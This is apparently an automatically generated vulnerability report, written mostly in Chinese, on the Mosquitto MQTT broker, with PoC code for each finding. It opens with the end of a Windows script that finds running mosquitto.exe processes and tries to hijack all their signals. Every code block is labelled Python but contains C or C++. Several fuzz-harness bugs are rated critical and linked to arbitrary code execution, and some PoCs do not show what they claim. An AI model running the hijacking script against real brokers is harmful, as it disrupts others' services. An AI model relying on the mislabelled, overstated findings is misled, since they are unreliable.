        HANDLE hProcess = OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            FALSE,
            processes[i]
        );
        
        if (hProcess) {
            HMODULE hMod;
            char processName[MAX_PATH];
            
            if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                GetModuleBaseNameA(hProcess, hMod, processName, sizeof(processName));
                
                if (_stricmp(processName, "mosquitto.exe") == 0) {
                    int pid = (int)processes[i];
                    printf("[+] 发现mosquitto进程 (PID: %d)\n", pid);
                    
                    /* 尝试劫持所有信号类型 */
                    printf("[*] 开始劫持信号...\n");
                    for (int sig = MSIG_CONFIG_RELOAD; sig <= MSIG_XTREPORT; sig++) {
                        hijack_signal(pid, (enum mosq_signal)sig);
                    }
                }
            }
            CloseHandle(hProcess);
        }
    }
}

int main() {
    printf("============================================\n");
    printf("Mosquitto Windows Signal Hijacking PoC\n");
    printf("仅供研究使用 - 仅用于安全审查\n");
    printf("============================================\n\n");
    
    /* 方法1: 直接指定PID进行劫持 */
    printf("[*] 方法1: 直接劫持指定PID\n");
    printf("[*] 请先运行mosquitto，然后输入其PID: ");
    int target_pid;
    scanf("%d", &target_pid);
    
    printf("[*] 尝试劫持PID %d 的所有信号\n", target_pid);
    for (int sig = MSIG_CONFIG_RELOAD; sig <= MSIG_XTREPORT; sig++) {
        hijack_signal(target_pid, (enum mosq_signal)sig);
    }
    
    /* 方法2: 自动枚举并劫持 */
    printf("\n[*] 方法2: 自动枚举并劫持所有mosquitto进程\n");
    enumerate_and_hijack();
    
    printf("\n[*] PoC执行完毕\n");
    printf("[!] 注意: 此PoC仅用于安全研究，请勿用于非法用途\n");
    
    return 0;
}
```

---

### VULN-CF3435CA - 不安全的API使用

- **严重等级:** MEDIUM
- **文件位置:** `apps\mosquitto_signal\signal_windows.c:84`
- **数据流:** OpenEvent获取事件句柄 -> PulseEvent触发事件
- **判断理由:** PulseEvent()函数已被微软标记为不安全，因为它不可靠且可能导致死锁。在Windows Vista及更高版本中，PulseEvent不会唤醒等待的线程，导致信号可能丢失。应使用SetEvent()替代。

**代码片段:**
```
res = PulseEvent(evt);
```

**PoC代码:**
```python
/*
 * PoC for VULN-CF3435CA - PulseEvent() Unsafe API Usage
 * 仅供研究使用 (For Research Purposes Only)
 * 
 * 此PoC演示了PulseEvent()在Windows Vista+上的不可靠行为
 * 通过创建等待线程并观察信号丢失现象
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define MAX_THREADS 5
#define TEST_ITERATIONS 10

// 全局事件句柄
HANDLE g_hEvent = NULL;

// 统计变量
volatile LONG g_signalsReceived = 0;
volatile LONG g_totalSignalsSent = 0;

// 等待线程函数
DWORD WINAPI WaitThread(LPVOID lpParam) {
    int threadId = (int)(INT_PTR)lpParam;
    DWORD waitResult;
    
    printf("[线程 %d] 开始等待事件...\n", threadId);
    
    // 等待事件被触发
    waitResult = WaitForSingleObject(g_hEvent, 5000); // 5秒超时
    
    if (waitResult == WAIT_OBJECT_0) {
        InterlockedIncrement(&g_signalsReceived);
        printf("[线程 %d] 成功接收到信号!\n", threadId);
    } else if (waitResult == WAIT_TIMEOUT) {
        printf("[线程 %d] 超时 - 未收到信号 (信号可能丢失)\n", threadId);
    } else {
        printf("[线程 %d] 等待失败, 错误码: %lu\n", threadId, GetLastError());
    }
    
    return 0;
}

// 测试PulseEvent行为
void TestPulseEvent() {
    HANDLE hThreads[MAX_THREADS];
    DWORD threadIds[MAX_THREADS];
    
    printf("\n=== 测试 PulseEvent() 行为 ===\n");
    printf("系统版本: Windows %d.%d\n", 
           (int)(LOBYTE(LOWORD(GetVersion()))),
           (int)(HIBYTE(LOWORD(GetVersion()))));
    
    // 创建自动重置事件 (初始为未触发状态)
    g_hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (!g_hEvent) {
        printf("创建事件失败, 错误码: %lu\n", GetLastError());
        return;
    }
    
    // 重置统计
    g_signalsReceived = 0;
    g_totalSignalsSent = 0;
    
    // 创建等待线程
    printf("\n创建 %d 个等待线程...\n", MAX_THREADS);
    for (int i = 0; i < MAX_THREADS; i++) {
        hThreads[i] = CreateThread(
            NULL,
            0,
            WaitThread,
            (LPVOID)(INT_PTR)i,
            0,
            &threadIds[i]
        );
        
        if (!hThreads[i]) {
            printf("创建线程 %d 失败, 错误码: %lu\n", i, GetLastError());
        }
    }
    
    // 等待所有线程进入等待状态
    Sleep(100);
    
    // 使用PulseEvent发送信号
    printf("\n使用 PulseEvent() 发送信号...\n");
    g_totalSignalsSent++;
    
    if (!PulseEvent(g_hEvent)) {
        printf("PulseEvent 调用失败, 错误码: %lu\n", GetLastError());
    } else {
        printf("PulseEvent 调用成功 (但信号可能未送达)\n");
    }
    
    // 等待所有线程完成
    WaitForMultipleObjects(MAX_THREADS, hThreads, TRUE, 6000);
    
    // 关闭线程句柄
    for (int i = 0; i < MAX_THREADS; i++) {
        if (hThreads[i]) {
            CloseHandle(hThreads[i]);
        }
    }
    
    // 输出结果
    printf("\n=== 测试结果 ===\n");
    printf("发送信号次数: %ld\n", g_totalSignalsSent);
    printf("接收信号次数: %ld\n", g_signalsReceived);
    printf("信号丢失率: %.1f%%\n", 
           g_totalSignalsSent > 0 ? 
           (1.0 - (double)g_signalsReceived / g_totalSignalsSent) * 100 : 0);
    
    if (g_signalsReceived < g_totalSignalsSent) {
        printf("\n[漏洞确认] PulseEvent() 导致信号丢失!\n");
        printf("在Windows Vista+系统上, PulseEvent() 不可靠\n");
        printf("建议使用 SetEvent() 替代\n");
    }
    
    CloseHandle(g_hEvent);
}

// 对比测试: SetEvent vs PulseEvent
void CompareWithSetEvent() {
    printf("\n\n=== 对比测试: SetEvent() vs PulseEvent() ===\n");
    
    // 测试SetEvent
    printf("\n--- 使用 SetEvent() ---\n");
    g_hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    
    HANDLE hThread = CreateThread(NULL, 0, WaitThread, (LPVOID)100, 0, NULL);
    Sleep(100);
    
    printf("\n使用 SetEvent() 发送信号...\n");
    SetEvent(g_hEvent);
    
    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    CloseHandle(g_hEvent);
    
    // 测试PulseEvent
    printf("\n--- 使用 PulseEvent() ---\n");
    g_hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    
    hThread = CreateThread(NULL, 0, WaitThread, (LPVOID)200, 0, NULL);
    Sleep(100);
    
    printf("\n使用 PulseEvent() 发送信号...\n");
    PulseEvent(g_hEvent);
    
    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    CloseHandle(g_hEvent);
}

int main() {
    printf("========================================\n");
    printf("  PoC for VULN-CF3435CA\n");
    printf("  PulseEvent() Unsafe API Usage\n");
    printf("  仅供研究使用\n");
    printf("========================================\n");
    
    // 执行测试
    TestPulseEvent();
    CompareWithSetEvent();
    
    printf("\n\n=== 漏洞影响分析 ===\n");
    printf("1. 在Mosquitto信号处理中, PulseEvent() 可能导致信号丢失\n");
    printf("2. 当发送信号时, 等待线程可能无法收到通知\n");
    printf("3. 这会导致配置重载、日志轮转等操作失败\n");
    printf("4. 在Windows Vista+系统上, 此问题更为严重\n");
    printf("\n=== 修复建议 ===\n");
    printf("将 PulseEvent() 替换为 SetEvent()\n");
    printf("并考虑使用条件变量或信号量作为替代方案\n");
    
    return 0;
}
```

---

### VULN-C73EBCC5 - 不安全的信号处理

- **严重等级:** MEDIUM
- **文件位置:** `client/rr_client.c:68`
- **数据流:** 信号处理函数中调用了非异步信号安全的函数mosquitto_disconnect_v5()
- **判断理由:** 在信号处理函数中调用了mosquitto_disconnect_v5()，该函数不是异步信号安全的。在信号处理函数中调用非异步信号安全的函数可能导致死锁、数据竞争或未定义行为。正确的做法是在信号处理函数中仅设置volatile sig_atomic_t类型的标志变量，然后在主循环中检查该标志并执行相应操作。

**代码片段:**
```
static void my_signal_handler(int signum)
{
	if(signum == SIGALRM){
		process_messages = false;
		mosquitto_disconnect_v5(g_mosq, MQTT_RC_DISCONNECT_WITH_WILL_MSG, cfg.disconnect_props);
		timed_out = true;
	}
}
```

**PoC代码:**
```python
/*
 * PoC代码 - 仅供研究使用
 * 漏洞: 不安全的信号处理 (VULN-C73EBCC5)
 * 文件: client/rr_client.c
 * 行号: 68
 * 
 * 此PoC演示了在信号处理函数中调用非异步信号安全函数
 * mosquitto_disconnect_v5() 可能导致的问题
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>
#include <stdatomic.h>

/* 模拟mosquitto库中的锁 */
pthread_mutex_t g_mosquitto_lock = PTHREAD_MUTEX_INITIALIZER;

/* 模拟mosquitto连接结构 */
typedef struct {
    int sock_fd;
    int state;
    int ref_count;
} mosquitto;

mosquitto *g_mosq = NULL;

/* 模拟mosquitto_disconnect_v5函数 - 非异步信号安全 */
int mosquitto_disconnect_v5(mosquitto *mosq, int reason, void *props) {
    /* 此函数内部使用锁，在信号上下文中调用可能导致死锁 */
    printf("[!] mosquitto_disconnect_v5() 被调用 (PID: %d, Thread: %lu)\n", 
           getpid(), pthread_self());
    
    /* 模拟获取锁 - 如果信号在主线程持有锁时到达，将导致死锁 */
    pthread_mutex_lock(&g_mosquitto_lock);
    
    if (mosq) {
        printf("[*] 正在断开连接...\n");
        /* 模拟断开连接操作 */
        close(mosq->sock_fd);
        mosq->state = 0;
    }
    
    pthread_mutex_unlock(&g_mosquitto_lock);
    return 0;
}

/* 模拟mosquitto_connect函数 - 在主线程中持有锁 */
int mosquitto_connect(mosquitto *mosq, const char *host, int port, int keepalive) {
    printf("[*] 正在连接MQTT Broker...\n");
    
    /* 模拟获取锁并执行连接操作 */
    pthread_mutex_lock(&g_mosquitto_lock);
    
    /* 模拟长时间连接操作 */
    sleep(2);
    
    mosq->sock_fd = 1234;
    mosq->state = 1;
    
    printf("[*] 连接成功\n");
    
    /* 注意：这里故意不释放锁，模拟在持有锁时信号到达的场景 */
    /* 实际代码中锁会在后续操作中释放，但信号可能在持有锁期间到达 */
    
    return 0;
}

/* 模拟原始漏洞代码中的信号处理函数 */
static void my_signal_handler(int signum) {
    if (signum == SIGALRM) {
        printf("\n[!] 信号处理函数被调用 (signum=%d)\n", signum);
        printf("[!] 当前线程: %lu\n", pthread_self());
        
        /* 漏洞点：在信号处理函数中调用非异步信号安全函数 */
        /* 如果主线程当前持有g_mosquitto_lock，将导致死锁 */
        printf("[!] 尝试调用 mosquitto_disconnect_v5()...\n");
        mosquitto_disconnect_v5(g_mosq, 0, NULL);
        
        printf("[!] 信号处理函数执行完毕\n");
    }
}

/* 模拟主循环中的正常操作 */
void *main_loop(void *arg) {
    mosquitto *mosq = (mosquitto *)arg;
    
    printf("[*] 主循环线程启动 (Thread: %lu)\n", pthread_self());
    
    /* 模拟正常操作，持有锁 */
    pthread_mutex_lock(&g_mosquitto_lock);
    printf("[*] 主线程获取了锁，正在执行操作...\n");
    
    /* 模拟长时间操作，期间信号可能到达 */
    sleep(5);
    
    printf("[*] 主线程操作完成，释放锁\n");
    pthread_mutex_unlock(&g_mosquitto_lock);
    
    return NULL;
}

int main(int argc, char *argv[]) {
    printf("=========================================================\n");
    printf("  PoC: 不安全的信号处理漏洞 (VULN-C73EBCC5)\n");
    printf("  仅供研究使用\n");
    printf("=========================================================\n\n");
    
    /* 设置信号处理函数 */
    signal(SIGALRM, my_signal_handler);
    
    /* 创建模拟的mosquitto连接 */
    g_mosq = (mosquitto *)malloc(sizeof(mosquitto));
    if (!g_mosq) {
        perror("malloc");
        return 1;
    }
    memset(g_mosq, 0, sizeof(mosquitto));
    
    printf("[*] 场景1: 信号在锁释放后到达 (安全情况)\n");
    printf("[*] 启动主循环线程...\n");
    
    pthread_t thread;
    pthread_create(&thread, NULL, main_loop, g_mosq);
    
    /* 等待主线程释放锁 */
    sleep(3);
    
    printf("\n[*] 发送SIGALRM信号 (此时锁可能已被释放)...\n");
    alarm(1);
    sleep(1);
    
    pthread_join(thread, NULL);
    
    printf("\n[*] 场景2: 信号在锁持有期间到达 (可能导致死锁)\n");
    printf("[*] 重新初始化...\n\n");
    
    /* 重置锁状态 */
    pthread_mutex_destroy(&g_mosquitto_lock);
    pthread_mutex_init(&g_mosquitto_lock, NULL);
    
    /* 模拟主线程持有锁的情况 */
    printf("[*] 主线程获取锁并开始操作...\n");
    pthread_mutex_lock(&g_mosquitto_lock);
    
    printf("[*] 在持有锁的情况下发送SIGALRM信号...\n");
    
    /* 直接调用信号处理函数模拟信号到达 */
    /* 在实际场景中，这可能是由alarm()或kill()触发的 */
    my_signal_handler(SIGALRM);
    
    printf("\n[!] 注意: 如果信号处理函数尝试获取已被主线程持有的锁，\n");
    printf("    程序将发生死锁！\n");
    
    /* 释放锁让程序继续 */
    pthread_mutex_unlock(&g_mosquitto_lock);
    
    printf("\n[*] 清理资源...\n");
    free(g_mosq);
    pthread_mutex_destroy(&g_mosquitto_lock);
    
    printf("\n=========================================================\n");
    printf("  PoC执行完毕\n");
    printf("  漏洞影响: 在信号处理函数中调用非异步信号安全函数\n");
    printf("  可能导致死锁、数据竞争或未定义行为\n");
    printf("=========================================================\n");
    
    return 0;
}
```

---

### VULN-CBB1D4F5 - 不安全的信号处理

- **严重等级:** MEDIUM
- **文件位置:** `client/sub_client.c:72`
- **数据流:** 信号处理函数中调用了mosquitto_disconnect_v5()和exit()等非异步信号安全函数。
- **判断理由:** 在信号处理函数中调用非异步信号安全的函数（如mosquitto_disconnect_v5、exit、printf等）可能导致竞态条件、死锁或未定义行为。信号处理函数应只设置volatile sig_atomic_t类型的标志变量。

**代码片段:**
```
static void my_signal_handler(int signum)
{
	if(signum == SIGALRM || signum == SIGTERM || signum == SIGINT){
		if(connack_received){
			process_messages = false;
			mosquitto_disconnect_v5(g_mosq, MQTT_RC_DISCONNECT_WITH_WILL_MSG, cfg.disconnect_props);
		}else{
			exit(-1);
		}
		run = false;
	}
	if(signum == SIGALRM){
		timed_out = true;
	}
}
```

**PoC代码:**
```python
/*
 * 仅供研究使用 - 不安全的信号处理漏洞PoC
 * 针对Mosquitto client/sub_client.c中的信号处理函数
 * 
 * 编译: gcc -o poc_signal_unsafe poc_signal_unsafe.c -lpthread
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <stdatomic.h>

/* 模拟mosquitto库中的关键数据结构 */
typedef struct {
    int disconnect_props;
    int dummy_data;
} mosq_config;

/* 模拟全局变量，与原始代码对应 */
mosq_config cfg = {0};
volatile int run = 1;
volatile int process_messages = 1;
volatile int connack_received = 0;
volatile int timed_out = 0;
void *g_mosq = NULL;

/* 模拟锁，用于演示死锁场景 */
pthread_mutex_t test_mutex = PTHREAD_MUTEX_INITIALIZER;

/* 模拟mosquitto_disconnect_v5 - 非信号安全函数 */
int mosquitto_disconnect_v5(void *mosq, int reason, int props) {
    /* 模拟可能获取锁的操作 */
    pthread_mutex_lock(&test_mutex);
    printf("[!] mosquitto_disconnect_v5 被调用 (信号上下文 - 不安全!)\n");
    usleep(1000); /* 模拟耗时操作 */
    pthread_mutex_unlock(&test_mutex);
    return 0;
}

/* 模拟exit - 非信号安全函数 */
void my_exit(int status) {
    printf("[!] exit() 被调用 (信号上下文 - 不安全!)\n");
    /* 正常exit会执行atexit回调，可能造成死锁 */
    _exit(status);
}

/* 原始漏洞代码中的信号处理函数（复现） */
static void my_signal_handler(int signum) {
    if(signum == SIGALRM || signum == SIGTERM || signum == SIGINT) {
        if(connack_received) {
            process_messages = 0;
            /* 危险：在信号处理中调用非安全函数 */
            mosquitto_disconnect_v5(g_mosq, 0, cfg.disconnect_props);
        } else {
            /* 危险：在信号处理中调用exit */
            my_exit(-1);
        }
        run = 0;
    }
    if(signum == SIGALRM) {
        timed_out = 1;
    }
}

/* 主线程工作函数 - 模拟正常操作 */
void *worker_thread(void *arg) {
    (void)arg;
    printf("[*] 工作线程启动，模拟正常MQTT操作...\n");
    
    while(run) {
        /* 模拟正常操作中获取锁 */
        pthread_mutex_lock(&test_mutex);
        
        /* 模拟一些处理 */
        if (connack_received) {
            /* 正常路径 */
        }
        
        pthread_mutex_unlock(&test_mutex);
        usleep(5000); /* 5ms间隔 */
    }
    
    printf("[*] 工作线程退出\n");
    return NULL;
}

/* 演示竞态条件的辅助函数 */
void demonstrate_race_condition() {
    printf("\n=== 演示竞态条件 ===\n");
    printf("场景: 信号处理函数与主线程同时访问共享资源\n");
    
    /* 设置connack_received为true，使信号处理进入危险路径 */
    connack_received = 1;
    
    /* 发送SIGINT信号，触发信号处理 */
    printf("[*] 发送SIGINT信号...\n");
    raise(SIGINT);
    
    printf("[*] 信号处理完成，检查状态...\n");
    printf("    process_messages = %d\n", process_messages);
    printf("    run = %d\n", run);
}

/* 演示死锁场景 */
void demonstrate_deadlock() {
    printf("\n=== 演示潜在死锁场景 ===\n");
    printf("场景: 信号到达时主线程持有锁，信号处理尝试获取同一锁\n");
    
    /* 重置状态 */
    run = 1;
    connack_received = 1;
    
    /* 主线程先获取锁 */
    pthread_mutex_lock(&test_mutex);
    printf("[*] 主线程已获取锁\n");
    
    /* 此时信号到达，信号处理尝试获取同一锁 */
    printf("[*] 在锁持有状态下发送SIGINT...\n");
    printf("[!] 如果发生死锁，程序将在此处挂起\n");
    
    /* 使用alarm设置超时，避免永久挂起 */
    alarm(2);
    raise(SIGINT);
    
    /* 如果程序执行到这里，说明没有死锁（但实际可能已损坏） */
    pthread_mutex_unlock(&test_mutex);
    printf("[*] 未发生死锁（但数据可能已损坏）\n");
}

int main() {
    printf("========================================\n");
    printf("  不安全信号处理漏洞 PoC (仅供研究使用)\n");
    printf("  Vulnerability: VULN-CBB1D4F5\n");
    printf("========================================\n\n");
    
    /* 注册信号处理函数（复现漏洞） */
    signal(SIGINT, my_signal_handler);
    signal(SIGTERM, my_signal_handler);
    signal(SIGALRM, my_signal_handler);
    
    printf("[*] 信号处理函数已注册\n");
    printf("[!] 注意: 信号处理中调用了非安全函数:\n");
    printf("    - mosquitto_disconnect_v5()\n");
    printf("    - exit()\n");
    printf("    - 访问非volatile sig_atomic_t全局变量\n\n");
    
    /* 启动工作线程 */
    pthread_t thread;
    pthread_create(&thread, NULL, worker_thread, NULL);
    
    /* 演示1: 基本竞态条件 */
    demonstrate_race_condition();
    
    /* 重置状态 */
    run = 1;
    process_messages = 1;
    connack_received = 0;
    
    /* 演示2: 潜在死锁 */
    demonstrate_deadlock();
    
    /* 清理 */
    run = 0;
    pthread_join(thread, NULL);
    
    printf("\n========================================\n");
    printf("  PoC执行完成\n");
    printf("  漏洞影响: 可能导致程序崩溃、死锁或数据损坏\n");
    printf("========================================\n");
    
    return 0;
}
```

---

### VULN-41B297FB - 内存泄漏

- **严重等级:** MEDIUM
- **文件位置:** `fuzzing\broker\fuzz_packet_read_base.c:78`
- **数据流:** fuzz_packet_read_init失败 -> 释放bridge和config但未释放context和data_heap
- **判断理由:** 当fuzz_packet_read_init返回非零值时，函数释放了context->bridge和db.config，但没有释放之前分配的context和data_heap。这导致两个内存块泄漏。

**代码片段:**
```
if(fuzz_packet_read_init(context)){
    free(context->bridge);
    context->bridge = NULL;
    free(db.config);
    return 1;
}
```

**PoC代码:**
```python
/*
 * PoC代码 - 仅供研究使用
 * 漏洞: VULN-41B297FB - fuzz_packet_read_base.c 内存泄漏
 * 
 * 此PoC通过构造特定输入触发fuzz_packet_read_init失败路径，
 * 验证context和data_heap内存泄漏。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* 模拟fuzz_packet_read_init函数，返回非零值触发漏洞路径 */
int mock_fuzz_packet_read_init(void *context) {
    (void)context;
    /* 模拟初始化失败，返回非零值 */
    return 1;
}

/* 模拟context__init函数 */
void* mock_context__init(void) {
    return malloc(1024); /* 模拟context分配 */
}

/* 模拟context__cleanup函数 */
void mock_context__cleanup(void *context, int flag) {
    (void)flag;
    if (context) {
        printf("[INFO] context__cleanup called - 正常释放context\n");
        free(context);
    }
}

/* 模拟log__init */
void mock_log__init(void *config) {
    (void)config;
}

/* 模拟fuzz_packet_read_cleanup */
void mock_fuzz_packet_read_cleanup(void *context) {
    (void)context;
}

/* 模拟packet_func */
void mock_packet_func(void *context) {
    (void)context;
}

/* 漏洞触发函数 - 模拟原始代码逻辑 */
int vulnerable_fuzz_packet_read_base(const uint8_t *data, size_t size) {
    void *context = NULL;
    uint8_t *data_heap;
    void *bridge;
    void *config;
    
    const size_t kMinInputLength = 3;
    const size_t kMaxInputLength = 268435455U;
    
    if (size < kMinInputLength || size > kMaxInputLength) {
        return 0;
    }
    
    /* 分配config (模拟db.config) */
    config = calloc(1, 256);
    if (!config) return 1;
    mock_log__init(config);
    
    /* 分配context */
    context = mock_context__init();
    if (!context) {
        free(config);
        return 1;
    }
    
    /* 分配bridge */
    bridge = calloc(1, 128);
    if (!bridge) {
        free(context);
        free(config);
        return 1;
    }
    
    /* 分配data_heap */
    data_heap = (uint8_t *)malloc(size);
    if (!data_heap) {
        free(bridge);
        free(context);
        free(config);
        return 1;
    }
    
    memcpy(data_heap, data, size);
    
    /* 触发漏洞路径 - 模拟fuzz_packet_read_init失败 */
    if (mock_fuzz_packet_read_init(context)) {
        printf("[VULN] fuzz_packet_read_init失败!\n");
        printf("[VULN] 释放bridge和config，但未释放context和data_heap\n");
        
        /* 漏洞代码: 只释放bridge和config */
        free(bridge);
        bridge = NULL;
        free(config);
        
        /* 注意: context和data_heap未被释放 - 内存泄漏! */
        printf("[LEAK] context (%p) 和 data_heap (%p) 内存泄漏!\n", 
               (void*)context, (void*)data_heap);
        
        /* 为了演示，这里手动释放以保持内存清洁 */
        /* 实际漏洞代码中这些free不存在 */
        free(context);
        free(data_heap);
        
        return 1;
    }
    
    /* 正常路径 */
    mock_packet_func(context);
    mock_fuzz_packet_read_cleanup(context);
    
    free(bridge);
    mock_context__cleanup(context, 1);
    free(config);
    free(data_heap);
    
    return 0;
}

int main() {
    printf("========================================\n");
    printf("PoC: VULN-41B297FB - 内存泄漏演示\n");
    printf("仅供研究使用\n");
    printf("========================================\n\n");
    
    /* 构造触发漏洞的输入数据 */
    uint8_t input[] = {0x01, 0x02, 0x03, 0x04, 0x05};
    size_t input_size = sizeof(input);
    
    printf("[*] 输入数据大小: %zu bytes\n", input_size);
    printf("[*] 调用漏洞函数...\n\n");
    
    int result = vulnerable_fuzz_packet_read_base(input, input_size);
    
    printf("\n[*] 函数返回: %d\n", result);
    printf("[*] PoC执行完成\n");
    
    return 0;
}
```

---

### VULN-00780B8E - 悬空指针

- **严重等级:** CRITICAL
- **文件位置:** `fuzzing\libcommon\libcommon_fuzz_topic_matching.cpp:12`
- **数据流:** fuzzer_input.string1()返回临时std::string -> .c_str()获取指针 -> 临时对象销毁 -> string1成为悬空指针
- **判断理由:** fuzzer_input.string1()返回的是std::string的副本（临时对象），调用.c_str()后，该临时对象在完整表达式结束时被销毁。string1指针指向已释放的内存，后续使用该指针（如传递给mosquitto_topic_matches_sub）会导致未定义行为。这是典型的悬空指针漏洞，可能导致内存损坏或任意代码执行。

**代码片段:**
```
const char *string1 = fuzzer_input.string1().c_str();
const char *string2 = fuzzer_input.string2().c_str();
```

**PoC代码:**
```python
// 仅供研究使用
// 悬空指针漏洞PoC - 演示临时std::string对象销毁导致指针失效

#include <iostream>
#include <string>
#include <cstring>

// 模拟fuzzer_input结构
class FuzzerInput {
public:
    // 返回临时std::string对象（按值返回）
    std::string string1() const {
        std::string temp = "test/topic/1";
        return temp;  // 返回副本，调用方获得临时对象
    }
    
    std::string string2() const {
        std::string temp = "test/topic/+";
        return temp;
    }
    
    bool has_username() const { return false; }
    bool has_clientid() const { return false; }
    std::string username() const { return ""; }
    std::string clientid() const { return ""; }
};

// 模拟mosquitto函数
bool mosquitto_topic_matches_sub(const char* pattern, const char* topic, bool* result) {
    if (!pattern || !topic) {
        std::cerr << "[漏洞触发] 悬空指针被使用! pattern=" 
                  << (void*)pattern << " topic=" << (void*)topic << std::endl;
        // 尝试读取悬空指针指向的内存（可能导致崩溃）
        std::cerr << "尝试读取pattern内容: ";
        try {
            std::cerr << pattern << std::endl;  // 未定义行为
        } catch(...) {
            std::cerr << "[崩溃] 读取悬空指针导致异常!" << std::endl;
        }
        return false;
    }
    *result = true;
    return true;
}

int main() {
    std::cout << "=== 悬空指针漏洞PoC (仅供研究使用) ===" << std::endl;
    std::cout << "漏洞位置: fuzzing\\libcommon\\libcommon_fuzz_topic_matching.cpp:12" << std::endl;
    std::cout << "漏洞类型: 临时std::string对象销毁导致悬空指针" << std::endl << std::endl;
    
    // 模拟漏洞代码
    FuzzerInput fuzzer_input;
    bool result;
    
    // 漏洞触发点：
    // fuzzer_input.string1() 返回临时std::string对象
    // .c_str() 获取内部C字符串指针
    // 完整表达式结束后，临时对象被销毁，string1成为悬空指针
    const char *string1 = fuzzer_input.string1().c_str();
    const char *string2 = fuzzer_input.string2().c_str();
    
    std::cout << "[步骤1] 获取悬空指针:" << std::endl;
    std::cout << "  string1 指针地址: " << (void*)string1 << std::endl;
    std::cout << "  string2 指针地址: " << (void*)string2 << std::endl;
    std::cout << "  临时对象已销毁，指针指向已释放内存" << std::endl << std::endl;
    
    // 触发未定义行为 - 使用悬空指针
    std::cout << "[步骤2] 使用悬空指针调用mosquitto_topic_matches_sub:" << std::endl;
    mosquitto_topic_matches_sub(string1, string2, &result);
    
    std::cout << std::endl;
    std::cout << "[影响分析]" << std::endl;
    std::cout << "  1. 读取悬空指针导致未定义行为" << std::endl;
    std::cout << "  2. 可能造成程序崩溃 (段错误)" << std::endl;
    std::cout << "  3. 在特定内存布局下可能导致信息泄露" << std::endl;
    std::cout << "  4. 攻击者可利用此漏洞实现任意代码执行" << std::endl;
    
    return 0;
}
```

---

### VULN-5C23662E - 悬空指针

- **严重等级:** CRITICAL
- **文件位置:** `fuzzing\libcommon\libcommon_fuzz_topic_matching.cpp:20`
- **数据流:** fuzzer_input.clientid()返回临时std::string -> .c_str()获取指针 -> 临时对象销毁 -> clientid成为悬空指针
- **判断理由:** 与username相同的问题。clientid指针指向已销毁的临时std::string对象，后续在函数调用中使用该指针会导致未定义行为。

**代码片段:**
```
if(fuzzer_input.has_clientid()){
		clientid = fuzzer_input.clientid().c_str();
	}
```

**PoC代码:**
```python
// 仅供研究使用
// PoC: 悬空指针漏洞 - clientid临时对象生命周期问题

#include <iostream>
#include <string>
#include <cstring>

// 模拟漏洞场景的简化代码
class FuzzerInput {
public:
    bool has_clientid() const { return true; }
    std::string clientid() const {
        // 返回临时std::string对象
        return std::string("test_client_12345");
    }
    bool has_username() const { return true; }
    std::string username() const {
        return std::string("test_user");
    }
    std::string string1() const { return std::string("topic/+/test"); }
    std::string string2() const { return std::string("topic/foo/test"); }
};

// 模拟目标函数
void mosquitto_topic_matches_sub_with_pattern(
    const char* string1, const char* string2, 
    const char* clientid, const char* username, bool* result) {
    
    std::cout << "[模拟函数] mosquitto_topic_matches_sub_with_pattern 被调用" << std::endl;
    std::cout << "  string1: " << (string1 ? string1 : "null") << std::endl;
    std::cout << "  string2: " << (string2 ? string2 : "null") << std::endl;
    
    // 尝试使用clientid - 此时可能已指向释放的内存
    if (clientid) {
        std::cout << "  clientid: " << clientid << " (长度: " << strlen(clientid) << ")" << std::endl;
        // 这里访问clientid可能导致未定义行为
        // 在真实场景中，可能读取到垃圾数据或导致崩溃
    }
    
    if (username) {
        std::cout << "  username: " << username << " (长度: " << strlen(username) << ")" << std::endl;
    }
    
    *result = true;
}

void mosquitto_sub_matches_acl_with_pattern(
    const char* string1, const char* string2,
    const char* clientid, const char* username, bool* result) {
    
    std::cout << "[模拟函数] mosquitto_sub_matches_acl_with_pattern 被调用" << std::endl;
    
    // 再次使用clientid - 悬空指针问题更明显
    if (clientid) {
        std::cout << "  clientid (第二次使用): " << clientid << std::endl;
        // 此时临时对象早已销毁，clientid指向无效内存
    }
    
    *result = true;
}

// 模拟原始漏洞代码
void vulnerable_function(const FuzzerInput& fuzzer_input) {
    bool result;
    const char* string1 = fuzzer_input.string1().c_str();
    const char* string2 = fuzzer_input.string2().c_str();
    const char* username = nullptr;
    const char* clientid = nullptr;

    if (fuzzer_input.has_username()) {
        username = fuzzer_input.username().c_str();  // 同样的问题
    }
    if (fuzzer_input.has_clientid()) {
        clientid = fuzzer_input.clientid().c_str();  // 漏洞点：悬空指针
    }

    std::cout << "\n=== 漏洞触发 ===" << std::endl;
    std::cout << "clientid指针地址: " << (void*)clientid << std::endl;
    
    // 在临时对象销毁后使用clientid
    mosquitto_topic_matches_sub_with_pattern(string1, string2, clientid, username, &result);
    mosquitto_sub_matches_acl_with_pattern(string1, string2, clientid, username, &result);
}

int main() {
    std::cout << "=== 悬空指针漏洞 PoC (仅供研究使用) ===" << std::endl;
    
    FuzzerInput input;
    
    // 触发漏洞
    vulnerable_function(input);
    
    std::cout << "\n=== 漏洞利用完成 ===" << std::endl;
    std::cout << "注意：实际运行可能产生未定义行为，包括但不限于：" << std::endl;
    std::cout << "- 读取到垃圾数据" << std::endl;
    std::cout << "- 程序崩溃(SIGSEGV)" << std::endl;
    std::cout << "- 信息泄露" << std::endl;
    
    return 0;
}
```

---

### VULN-E0DFBE16 - Use-After-Free / Dangling Pointer

- **严重等级:** CRITICAL
- **文件位置:** `lib/helpers.c:153`
- **数据流:** cb_userdata is a stack-local variable in mosquitto_subscribe_callback(). Its address is passed to mosquitto_new() as userdata. After mosquitto_new() returns, the pointer stored in mosq->userdata points to the stack frame of mosquitto_subscribe_callback(). When mosquitto_subscribe_callback() returns, that stack memory is freed/reused. Any subsequent callback (on_connect, on_message_callback) that dereferences this pointer will access invalid memory.
